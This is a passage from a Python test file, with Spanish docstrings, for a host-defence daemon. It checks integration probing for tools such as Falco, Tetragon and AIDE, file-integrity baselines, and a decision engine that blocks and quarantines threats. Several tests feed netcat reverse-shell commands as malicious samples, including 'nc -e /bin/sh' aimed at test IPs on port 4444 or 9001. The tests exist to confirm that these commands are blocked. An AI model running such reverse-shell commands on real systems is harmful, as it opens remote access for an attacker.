        self.assertIn("rollback", result["rollback_status"].lower())

    def test_external_integrations_probing_and_requirements_transparency(self):
        """
        Verifica la transparencia arquitectónica de integraciones externas:
        1. requirements.txt existe, define dependencias obligatorias (cryptography, PyYAML)
           y diferencia dependencias opcionales de librerías vs servicios independientes del SO.
        2. Probing dinámico en adaptadores (Tetragon, Falco, Wazuh, osquery, MISP, Sigma, ClamAV):
           - No asumen que los servicios externos están instalados por defecto.
           - Si el demonio/binario no está en el SO, reportan modo STANDALONE_... con detalle claro.
        3. Scanner.get_engine_manifest() retorna el manifiesto verificado de motores.
        4. Demonio expone GET_INTEGRATIONS_STATUS a través de IPC.
        """
        req_path = os.path.join(ROOT_DIR, "requirements.txt")
        self.assertTrue(os.path.exists(req_path), "requirements.txt debe existir en la raíz del proyecto")
        with open(req_path, "r", encoding="utf-8") as f:
            req_content = f.read()
        self.assertIn("cryptography", req_content)
        self.assertIn("PyYAML", req_content)
        self.assertIn("pySigma", req_content)
        self.assertIn("pymisp", req_content)
        self.assertIn("osquery", req_content)
        self.assertIn("falco", req_content)
        self.assertIn("wazuh", req_content)
        self.assertIn("tetragon", req_content)

        from core.engine.tetragon_monitor import TetragonMonitor
        from core.engine.falco_monitor import FalcoMonitor
        from core.engine.wazuh_detector import WazuhDetector
        from core.engine.osquery_diagnostics import OSQueryDiagnostics
        from core.engine.misp_feed_manager import MISPFeedManager
        from core.engine.sigma_engine import SigmaEngine

        tetragon = TetragonMonitor()
        probe_tetra = tetragon.probe_integration()
        self.assertIn("mode", probe_tetra)
        self.assertIn("daemon_installed", probe_tetra)
        if not probe_tetra["daemon_running"]:
            self.assertEqual(probe_tetra["mode"], "STANDALONE_POLICY_EMULATOR")

        falco = FalcoMonitor()
        probe_falco = falco.probe_integration()
        self.assertIn("mode", probe_falco)
        if not probe_falco["daemon_running"]:
            self.assertEqual(probe_falco["mode"], "STANDALONE_RULE_MATCHER")

        wazuh = WazuhDetector()
        probe_wazuh = wazuh.probe_integration()
        self.assertIn("mode", probe_wazuh)
        if not probe_wazuh["agent_running"]:
            self.assertEqual(probe_wazuh["mode"], "STANDALONE_FIM_YARA_ENGINE")

        osq = OSQueryDiagnostics()
        probe_osq = osq.probe_integration()
        self.assertIn("mode", probe_osq)
        if not probe_osq["binary_installed"]:
            self.assertEqual(probe_osq["mode"], "STANDALONE_SQLITE_FACADE")

        misp = MISPFeedManager()
        probe_misp = misp.probe_integration()
        self.assertIn("mode", probe_misp)
        self.assertIn("library_installed", probe_misp)

        sigma = SigmaEngine()
        probe_sigma = sigma.probe_integration()
        self.assertIn("mode", probe_sigma)
        self.assertIn("library_installed", probe_sigma)

        scanner = Scanner()
        manifest = scanner.get_engine_manifest()
        self.assertIn("yarax", manifest)
        self.assertIn("clamav", manifest)
        self.assertIn("sigma", manifest)
        self.assertIn("heuristic", manifest)

        daemon = ConstantineDaemon(is_test=True)
        status, data, msg = daemon.dispatch_ipc_command("GET_INTEGRATIONS_STATUS", {})
        self.assertEqual(status, "OK")
        self.assertIn("tetragon", data)
        self.assertIn("falco", data)
        self.assertIn("wazuh", data)
        self.assertIn("osquery", data)
        self.assertIn("misp", data)
        self.assertIn("sigma", data)
        self.assertIn("clamav", data)

    def test_aide_integrity_checker_baseline_and_probing(self):
        """
        Verifica el Verificador de Integridad de Archivos Críticos basado en AIDE:
        1. Probing dinámico (NATIVE_AIDE_BINARY vs STANDALONE_BASELINE_ENGINE).
        2. Creación e inicialización de línea base criptográfica (SHA-256, permisos, tamaño).
        3. Verificación de estado íntegro (CLEAN).
        4. Detección de manipulaciones no autorizadas (INTEGRITY_VIOLATION, HASH_MISMATCH, eliminación).
        5. Comando IPC CHECK_AIDE_INTEGRITY en el demonio.
        """
        from core.engine.aide_integrity import AIDEIntegrityChecker

        aide_dir = tempfile.mkdtemp()
        baseline_file = os.path.join(aide_dir, "aide_baseline.json")

        critical_file = os.path.join(aide_dir, "critical_binary.bin")
        with open(critical_file, "wb") as f:
            f.write(b"ORIGINAL_SYSTEM_BINARY_CONTENT_V1")

        checker = AIDEIntegrityChecker(baseline_path=baseline_file, monitored_dirs=[aide_dir])

        # 1. Probing
        probe = checker.probe_integration()
        self.assertIn("mode", probe)
        self.assertIn("AIDE", probe["name"])

        # 2. Inicializar línea base
        init_res = checker.init_baseline(target_dirs=[aide_dir])
        self.assertEqual(init_res["status"], "INITIALIZED")
        self.assertGreaterEqual(init_res["files_indexed"], 1)
        self.assertTrue(os.path.exists(baseline_file))

        # 3. Verificación de integridad limpia
        clean_res = checker.check_integrity()
        self.assertEqual(clean_res["status"], "CLEAN")
        self.assertEqual(clean_res["violations_count"], 0)

        # 4. Simulación de manipulación hostil
        with open(critical_file, "wb") as f:
            f.write(b"TAMPERED_MALICIOUS_ROOTKIT_CODE")

        tamper_res = checker.check_integrity()
        self.assertEqual(tamper_res["status"], "INTEGRITY_VIOLATION")
        self.assertEqual(tamper_res["violations_count"], 1)
        self.assertIn("HASH_MISMATCH", tamper_res["modified"][0]["issues"])

        # 5. Despacho IPC en daemon
        daemon = ConstantineDaemon(is_test=True)
        status, data, msg = daemon.dispatch_ipc_command("CHECK_AIDE_INTEGRITY", {})
        self.assertEqual(status, "OK")
        self.assertIn("status", data)

        shutil.rmtree(aide_dir)

    def test_security_decision_engine_and_blocking_capabilities(self):
        """
        Verifica el Motor de Decisiones de Seguridad (SecurityDecisionEngine) y la matriz de bloqueo real:
        1. Bloqueo de Procesos (Tetragon + BPF LSM / SIGKILL Fallback):
           - Proceso sospechoso denegado.
           - Proceso legítimo permitido.
        2. Bloqueo Conductual (Falco - Complemento Opcional):
           - Alerta crítica -> Aislamiento de red (Firewall drop).
           - Posibilidad de desactivar/activar Falco como complemento.
        3. Bloqueo de Acceso a Archivos (Fanotify):
           - Archivo malicioso -> FAN_DENY + Cuarentena atómica en Baúl.
        4. Verificación de capacidades reales mediante IPC GET_BLOCKING_CAPABILITIES.
        """
        from core.engine.security_decision_engine import SecurityDecisionEngine

        vault = CryptographicVault(base_dir=self.temp_dir.name)
        firewall = FirewallManager()
        engine = SecurityDecisionEngine(vault=vault, firewall=firewall)

        # 1. Tetragon / Proceso Malicioso
        tetragon = TetragonMonitor()
        dec_proc = engine.evaluate_process_execution(105, "/bin/nc", ["-e", "/bin/sh", "1.2.3.4", "4444"], tetragon_monitor=tetragon)
        self.assertTrue(dec_proc.is_blocked)
        self.assertIn("TETRAGON", dec_proc.primary_engine)
        self.assertIn(dec_proc.enforcement_action, ("BPF_LSM_EPERM", "SIGKILL_CONTAINMENT"))

        # Proceso Limpio
        dec_clean = engine.evaluate_process_execution(106, "/usr/bin/curl", ["https://example.com"], tetragon_monitor=tetragon)
        self.assertFalse(dec_clean.is_blocked)
        self.assertEqual(dec_clean.enforcement_action, "ALLOW")

        # 2. Falco / Syscall Conductual
        falco = FalcoMonitor()
        dec_falco = engine.evaluate_behavioral_syscall({
            "proc": "nc -e /bin/bash 192.168.1.50 9001",
            "fd": "3",
            "pid": 7722,
            "dport": 9001
        }, falco_monitor=falco)
        self.assertTrue(dec_falco.is_blocked)
        self.assertEqual(dec_falco.enforcement_action, "NETWORK_ISOLATE")
        self.assertTrue(dec_falco.network_isolated)

        # Desactivación opcional de Falco
        engine.set_falco_enabled(False)
        dec_falco_off = engine.evaluate_behavioral_syscall({"proc": "nc -e /bin/bash", "pid": 7722}, falco_monitor=falco)
        self.assertFalse(dec_falco_off.is_blocked)
        engine.set_falco_enabled(True)

        # 3. Fanotify / Acceso a Archivos
        scanner = Scanner()
        bad_path = os.path.join(self.temp_dir.name, "bad_script.sh")
        with open(bad_path, "w") as f:
            f.write("nc -e /bin/sh 10.0.0.1 4444")
        fd = os.open(bad_path, os.O_RDONLY)
        dec_file = engine.evaluate_file_access(bad_path, fd, pid=470, comm="test", scanner=scanner)
        os.close(fd)
        self.assertTrue(dec_file.is_blocked)
        self.assertEqual(dec_file.enforcement_action, "FANOTIFY_DENY")
        self.assertTrue(dec_file.quarantined)

        # 5. Integración de Seguridad Integral: osquery, AIDE, Sigma y MISP
        # 5a. osquery postura
        osq = OSQueryDiagnostics()
        dec_osq = engine.evaluate_system_posture(osq)
        self.assertFalse(dec_osq.is_blocked)
        self.assertEqual(dec_osq.primary_engine, "OSQUERY")

        # 5b. AIDE integridad
        aide_checker = AIDEIntegrityChecker(baseline_path=os.path.join(self.temp_dir.name, "decision_aide.json"))
        dec_aide = engine.evaluate_system_integrity(aide_checker)
        self.assertIn("AIDE", dec_aide.primary_engine)

        # 5c. Reglas Sigma conectadas en ejecución de proceso
        sigma_eng = SigmaEngine()
        dec_sigma = engine.evaluate_process_execution(999, "/usr/bin/visudo", ["/etc/sudoers"], sigma_engine=sigma_eng)
        self.assertTrue(dec_sigma.is_blocked)
        self.assertEqual(dec_sigma.primary_engine, "SIGMA")

        # 5d. MISP como fuente opcional de inteligencia
        misp_mgr = MISPFeedManager(intel_engine=scanner.intel)
        self.assertTrue(misp_mgr.enabled)
        misp_mgr.set_enabled(False)
        self.assertIsNone(misp_mgr.lookup_ioc("198.51.100.55"))
        misp_mgr.set_enabled(True)
        self.assertIsNotNone(misp_mgr.lookup_ioc("198.51.100.55"))

        # 4 & 5e. IPC GET_BLOCKING_CAPABILITIES y Comandos MISP en Demonio
        daemon = ConstantineDaemon(is_test=True)
        status, caps, msg = daemon.dispatch_ipc_command("GET_BLOCKING_CAPABILITIES", {})
        self.assertEqual(status, "OK")
        self.assertIn("filesystem_on_access", caps)
        self.assertEqual(caps["filesystem_on_access"]["capability"], "BLOCK_PREVENTIVE")
        self.assertIn("process_execution_enforcement", caps)
        self.assertIn("behavioral_syscall_enforcement", caps)
        self.assertIn("telemetry_tracepoints", caps)
        self.assertEqual(caps["telemetry_tracepoints"]["capability"], "OBSERVATION_ONLY")

        status_misp, data_misp, _ = daemon.dispatch_ipc_command("SET_MISP_ENABLED", {"enabled": False})
        self.assertEqual(status_misp, "OK")
        status_cfg, data_cfg, _ = daemon.dispatch_ipc_command("CONFIGURE_MISP_REMOTE", {"url": "https://misp.local", "api_key": "secret"})
        self.assertEqual(status_cfg, "OK")
        self.assertTrue(data_cfg["configured"])
        status, caps, msg = daemon.dispatch_ipc_command("GET_BLOCKING_CAPABILITIES", {})
        self.assertEqual(status, "OK")
        self.assertIn("filesystem_on_access", caps)
        self.assertEqual(caps["filesystem_on_access"]["capability"], "BLOCK_PREVENTIVE")
        self.assertIn("process_execution_enforcement", caps)
        self.assertIn("behavioral_syscall_enforcement", caps)
        self.assertIn("telemetry_tracepoints", caps)
        self.assertEqual(caps["telemetry_tracepoints"]["capability"], "OBSERVATION_ONLY")

if __name__ == "__main__":
    unittest.main()
